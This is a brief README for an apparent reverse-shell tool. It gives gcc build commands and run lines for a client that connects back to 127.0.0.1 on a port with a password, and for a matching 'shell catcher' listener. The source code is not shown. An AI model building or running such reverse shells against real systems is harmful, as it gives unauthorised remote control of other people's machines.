# Useage

## Reverse Shell
```
gcc -o rev.bin reverse-shell.c
./rev.bin 127.0.0.1 58009 mysecretpassword
```

## Shell Catcher
```
gcc -o server ./server.c
./server 58008 mysecretpassword 
```
